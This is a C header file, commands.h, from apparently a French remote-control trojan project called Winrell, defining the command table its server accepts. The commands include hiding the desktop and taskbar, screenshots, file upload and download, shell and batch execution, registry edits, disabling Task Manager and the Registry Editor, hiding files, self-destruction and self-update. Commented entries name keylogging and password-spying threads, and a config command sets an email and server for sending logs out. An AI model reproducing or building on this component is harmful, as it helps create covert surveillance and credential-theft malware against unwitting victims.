//=============================================================================
// Projet : Winrell (server)
// Fichier : commands.h
//
// @ Les préfixes des commandes ne devraient pas/jamais contenir des espaces.
//=============================================================================

#ifndef COMMANDS_H
#define COMMANDS_H

#define COMMAND_BUF_SIZE    256

//=============================================================================
//                              Structure Commande
//
//=============================================================================

typedef struct
{
   char nom[COMMAND_BUF_SIZE];
   char param1[COMMAND_BUF_SIZE];
   char param2[COMMAND_BUF_SIZE];
   char param3[COMMAND_BUF_SIZE];
   char param4[COMMAND_BUF_SIZE];
   char param5[COMMAND_BUF_SIZE];
   char param6[COMMAND_BUF_SIZE];
}Commande;

Commande cmd[] = {
         {"Hide_Desktop", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Show_Desktop", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Hide_Taskbar", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Show_Taskbar", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Turn_Off", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Reboot", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Menveille", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Stop_Crunning", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Black_Screen", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Adsl_Disconnect", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Adsl_Connect", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Open_Cd-rom", "&_Close|NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Set_Volume", "vol(int[0..65535])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Create_File", "path without '\\'(string)", "name(string)", "0/1(int[hide/show])", "contains(string)", "NULL", "NULL"},
         {"Create_Directory", "path|name(string[BUF_SIZE])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Del_Directory", "path|name(string[BUF_SIZE])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Change_Time", "day(int)", "month(int)", "year(int)", "hour(int)", "minute(int)", "NULL"},
         {"Bip_Bip", "repeat(int)", "sleep ms(int)", "NULL", "NULL", "NULL", "NULL"},
         {"Batch_Cmd", "cmd(string)", "param1(string)", "param2(string)|NULL", "NULL", "NULL", "NULL"},
         {"Explore_Directory", "path(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Explore_Drives", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Shell_Exec", "path/website(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Read_File", "string(log|config|hosts)|path(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Del_File", "path(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Get_F_Info", "file/folder path(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Set_F_Info", "string(SYSTEM|HIDDEN|SYSTEM&HIDDEN|NORMAL)", "file/folder path(string)", "NULL", "NULL", "NULL", "NULL"},
         {"Liste_Processus", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Stop_Prg", "processus(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Block_Site", "website(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Reg_Set", "string(CREER|OUVRIR|SUPPRIMER)", "|(separateur)path(string)", "|(separateur)string(HKEY_CURRENT_USER|HKEY_CLASSES_ROOT|HKEY_LOCAL_MACHINE|HKEY_USERS|HKEY_CURRENT_CONFIG)", "|(separateur)name(string)", "|(separateur)string(REG_BINARY|REG_SZ|REG_DWORD)", "|(separateur)value(string|int)"},
         //{"Message_Box", "string", "NULL", "NULL", "NULL", "NULL", "NULL"},
         //{"Run_Thread", "int(0/1/2/3[EnvoyerLog/PopConnexion/Espion/EspionMdp])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         //{"Kill_Thread", "int(0/1/2/3[EnvoyerLog/PopConnexion/Espion/EspionMdp])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Exit_Order", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Send_File", "string(log|tasks|explore|explore->path(string)|path(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Recv_File", "path|name(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Send_Pict", "quality(int[5..100])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Send_Small_Pict", "width(int)", "height(int)", "NULL", "NULL", "NULL", "NULL"},
         //{"Multi_Pict", "pict number(int)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Reset_Log", "int(0|1[AFTER|NOW])", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"File_Opr", "string(COPY|DELETE|MOVE|RENAME)", "pathFrom(string)", "|(separateur)-(char)|pathTo(string)", "NULL", "NULL", "NULL"},
         {"New_Version_Update", "path/name(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         //{"Force_Update", "path/name(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Date_Time", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Current_Version", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Current_Directory", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Reset", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"L_Mouse_Clic", "x(int)", "y(int)", "width(int)", "height(int)", "NULL", "NULL"},
         {"D_L_Mouse_Clic", "x(int)", "y(int)", "width(int)", "height(int)", "NULL", "NULL"},
         {"R_Mouse_Clic", "x(int)", "y(int)", "width(int)", "height(int)", "NULL", "NULL"},
         {"Self_Destruction", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Update_Config", "email(string)|(separateur)serveur(string)|port(int)|senderSleepTime(int)|StopEspion[0-1]|StopSender[0-1]|StopEspionMdp[0-1]|StopClient[0-1]", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Add_ToDo", "time(int)|commande(string)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Delete_ToDo", "id(int)", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"List_ToDo", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Free_ToDo", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Set_Task_Manager", "ON|OFF", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Set_Registry_Editor", "ON|OFF", "NULL", "NULL", "NULL", "NULL", "NULL"},
         {"Get_Elapsed_Time", "NULL", "NULL", "NULL", "NULL", "NULL", "NULL"}
         //{"OnBoot", "cmds(string)", "NULL", "NULL", "NULL", "NULL", "NULL"}
         };

#endif
